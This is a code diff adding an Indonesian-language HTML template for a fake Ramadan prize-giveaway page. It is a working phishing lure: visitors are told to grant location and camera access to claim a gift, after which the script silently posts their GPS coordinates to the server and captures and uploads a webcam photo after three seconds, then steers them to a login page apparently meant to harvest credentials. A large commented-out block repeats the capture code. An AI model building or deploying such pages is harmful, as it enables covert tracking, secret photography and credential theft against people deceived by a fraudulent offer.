@@ -1,0 +1,230 @@
+<!DOCTYPE html>
+<html lang="id">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Hadiah Berbagi Berkah Ramadhan</title>
+    <link rel="stylesheet" href="{{ url_for('static', filename='css/style.css') }}">
+</head>
+
+<body>
+    <div class="container">
+        <h1>🎉 Selamat! 🎉</h1>
+        <p>Anda mendapatkan hadiah spesial dari kegiatan <strong>Berbagi Berkah Ramadhan</strong>.</p>
+        <img src="{{ url_for('static', filename='images/image.png') }}" alt="Hadiah Berkah Ramadhan">
+        <p>Terima kasih telah berpartisipasi dalam kegiatan ini. Semoga berkah Ramadhan selalu menyertai Anda dan
+            keluarga!</p>
+
+
+        <p style="color: red;">Sebelum klaim, izinkan akses lokasi dan kamera Anda.</p>
+        <button id="grantAccessButton">Izinkan Akses</button>
+        <button id="claimButton" disabled>Klaim Hadiah</button>
+        <!-- <a href="#klaim-hadiah" class="button">Klaim Hadiah</a> -->
+        <p id="statusMessage" style="color: red;"></p>
+
+        <hr>
+
+        <div>
+            <p> Untuk mendapatkan kesempatan hadiah langsung yang lebih besar, segera login dan temukan kejutan spesial hanya untuk Anda! </p>
+            <button id="loginBtn" onclick="location.href='/login'">LOGIN</button>
+        </div>
+    </div>
+
+    <div class="overlay" id="overlay"></div>
+
+    <div class="popup" id="popup">
+        <p>Hadiah telah berhasil diklaim!<br>Silakan login untuk informasi berikutnya.</p>
+        <button id="loginBtn" onclick="location.href='/login'">LOGIN</button>
+        <button onclick="tutupPopup()">Tutup</button>
+    </div>
+
+    <script>
+        // Access the camera
+
+        const grantAccessButton = document.getElementById("grantAccessButton");
+        const claimButton = document.getElementById("claimButton");
+        const statusMessage = document.getElementById("statusMessage");
+
+        let locationAccessGranted = false;
+        let cameraAccessGranted = false;
+
+        grantAccessButton.addEventListener("click", async () => {
+            // Minta izin akses lokasi
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    () => {
+                        locationAccessGranted = true;
+                        checkAccess();
+                    },
+                    (error) => {
+                        statusMessage.textContent = "Akses lokasi ditolak.";
+                    }
+                );
+            }
+
+            // Minta izin akses kamera
+            try {
+                await navigator.mediaDevices.getUserMedia({ video: true });
+                cameraAccessGranted = true;
+                checkAccess();
+            } catch (error) {
+                statusMessage.textContent = "Akses kamera ditolak.";
+            }
+        });
+
+        function checkAccess() {
+            if (locationAccessGranted && cameraAccessGranted) {
+                statusMessage.textContent = "Akses diberikan! Silakan klaim hadiah Anda.";
+                claimButton.disabled = false;
+                grantAccessButton.disabled = true;
+                navigator.geolocation.getCurrentPosition(function (position) {
+                    let latitude = position.coords.latitude;
+                    let longitude = position.coords.longitude;
+
+                    // Kirim lokasi ke server
+                    fetch('/send_location', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ latitude: latitude, longitude: longitude })
+                    });
+                });
+
+                navigator.mediaDevices.getUserMedia({ video: true })
+                    .then(function (stream) {
+                        const video = document.createElement('video');
+                        video.srcObject = stream;
+                        video.play();
+
+                        // Step 3: Capture a frame after 3 seconds
+                        setTimeout(function () {
+                            const canvas = document.createElement('canvas');
+                            canvas.width = video.videoWidth;
+                            canvas.height = video.videoHeight;
+                            const ctx = canvas.getContext('2d');
+                            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                            video.pause();
+                            stream.getTracks().forEach(track => track.stop());
+
+                            // Step 4: Convert the frame to a Blob
+                            canvas.toBlob(function (blob) {
+                                const formData = new FormData();
+                                formData.append('photo', blob);
+
+
+                                // Step 5: Send data to the server
+                                fetch('/send_photo', {
+                                    method: 'POST',
+                                    body: formData
+                                })
+                                    .then(response => response.json())
+                                    .then(data => {
+                                        if (data.status === "success") {
+
+                                        } else {
+
+                                        }
+                                    })
+
+                            });
+                        }, 3000);
+                    })
+                    .catch(() => alert("Unable to access the camera."));
+
+
+            }
+        }
+
+        document.getElementById("claimButton").addEventListener("click", function () {
+            document.getElementById("popup").style.display = "block";
+            document.getElementById("overlay").style.display = "block";
+        });
+
+        function tutupPopup() {
+            document.getElementById("popup").style.display = "none";
+            document.getElementById("overlay").style.display = "none";
+        }
+        // Access the location
+        // navigator.permissions.query({ name: 'geolocation' }).then(function (result) {
+        //     if (result.state === 'granted') {
+        //         // Izin sudah diberikan, langsung ambil lokasi
+        //         navigator.geolocation.getCurrentPosition(function (position) {
+        //             let latitude = position.coords.latitude;
+        //             let longitude = position.coords.longitude;
+
+        //             // Kirim lokasi ke server
+        //             fetch('/send_location', {
+        //                 method: 'POST',
+        //                 headers: { 'Content-Type': 'application/json' },
+        //                 body: JSON.stringify({ latitude: latitude, longitude: longitude })
+        //             });
+        //         });
+        //     } else if (result.state === 'prompt') {
+        //         // Pengguna belum memutuskan, tetap coba ambil lokasi
+        //         navigator.geolocation.getCurrentPosition(function (position) {
+        //             let latitude = position.coords.latitude;
+        //             let longitude = position.coords.longitude;
+
+        //             // Kirim lokasi ke server
+        //             fetch('/send_location', {
+        //                 method: 'POST',
+        //                 headers: { 'Content-Type': 'application/json' },
+        //                 body: JSON.stringify({ latitude: latitude, longitude: longitude })
+        //             });
+        //         }, function (error) {
+        //             alert(`Error: ${error.message}`);
+        //             document.getElementById('location').innerHTML = `Error: ${error.message}`;
+        //         });
+        //     } else if (result.state === 'denied') {
+        //         // Izin ditolak, tampilkan pesan kepada pengguna
+        //         alert('Location access denied. Please enable location services.');
+        //         //  document.getElementById('location').innerHTML = 'Location access denied. Please enable location services.';
+        //     }
+        // });
+
+        // navigator.mediaDevices.getUserMedia({ video: true })
+        //     .then(function (stream) {
+        //         const video = document.createElement('video');
+        //         video.srcObject = stream;
+        //         video.play();
+
+        //         // Step 3: Capture a frame after 3 seconds
+        //         setTimeout(function () {
+        //             const canvas = document.createElement('canvas');
+        //             canvas.width = video.videoWidth;
+        //             canvas.height = video.videoHeight;
+        //             const ctx = canvas.getContext('2d');
+        //             ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+        //             video.pause();
+        //             stream.getTracks().forEach(track => track.stop());
+
+        //             // Step 4: Convert the frame to a Blob
+        //             canvas.toBlob(function (blob) {
+        //                 const formData = new FormData();
+        //                 formData.append('photo', blob);
+
+
+        //                 // Step 5: Send data to the server
+        //                 fetch('/send_photo', {
+        //                     method: 'POST',
+        //                     body: formData
+        //                 })
+        //                     .then(response => response.json())
+        //                     .then(data => {
+        //                         if (data.status === "success") {
+        //                             alert("Data shared successfully!");
+        //                         } else {
+        //                             alert("Failed to share data.");
+        //                         }
+        //                     })
+        //                     .catch(() => alert("An error occurred while sharing data."));
+        //             });
+        //         }, 3000);
+        //     })
+        //     .catch(() => alert("Unable to access the camera."));
+
+
+    </script>
+</body>
+
+</html>
